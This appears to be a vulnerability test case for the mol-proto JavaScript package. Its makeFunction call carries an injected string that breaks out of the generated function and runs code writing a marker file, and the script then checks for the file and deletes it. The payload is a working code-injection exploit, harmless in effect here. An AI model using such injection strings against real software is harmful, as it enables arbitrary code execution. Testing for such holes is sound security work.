// test("Arbitrary code execution in mol-proto", () => {
//   expect.assertions(2);
  const fs = require("fs");
  const mp = require("mol-proto");
  const path = "./mol-proto";
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + false + " }");
  try {
    mp.makeFunction(
      "a",
      "b",
      "};require('fs').writeFileSync('./mol-proto', '');{"
    );
  } catch (error) {}
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + true + " }");
  fs.unlink(path, function (err) {});
// });
